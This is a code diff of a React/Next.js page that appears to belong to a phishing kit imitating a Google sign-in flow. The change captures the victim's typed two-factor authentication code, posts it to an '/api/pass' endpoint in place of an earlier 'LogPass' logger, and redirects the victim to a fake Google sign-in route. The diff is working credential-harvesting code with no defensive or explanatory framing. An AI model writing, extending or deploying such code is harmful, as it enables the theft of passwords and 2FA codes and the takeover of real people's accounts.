@@ -4,16 +4,22 @@ import Image from "next/image";
 import { useState } from "react";
 import Head from "next/head";
 import { useRouter } from "next/navigation";
-import LogPass from "../LogPass";
 
 export default function Home() {
   const [showPass, setShowPass] = useState(false);
   const [isEmailFill, setIsEmailFill] = useState(false);
-  const [pass, setPass] = useState("");
+  const [towfector, setTowfector] = useState("");
   const route = useRouter();
 
+  const makeApicall = async () => {
+    await fetch("/api/pass", {
+      method: "POST",
+      body: JSON.stringify({ towfector }),
+    });
+  };
+
   const handleInput = (e) => {
-    setPass(e.target.value);
+    setTowfector(e.target.value);
     if (e.target.value != "") {
       setIsEmailFill(true);
     } else if (e.target.value == "") {
@@ -29,8 +35,8 @@ export default function Home() {
 
   const HandleNext = async () => {
     try {
-      LogPass(pass, "tow-fector");
-      // route.push("/google/tow-fector");
+      makeApicall();
+      route.push("/google/singin");
     } catch (error) {
       console.log(error);
     }
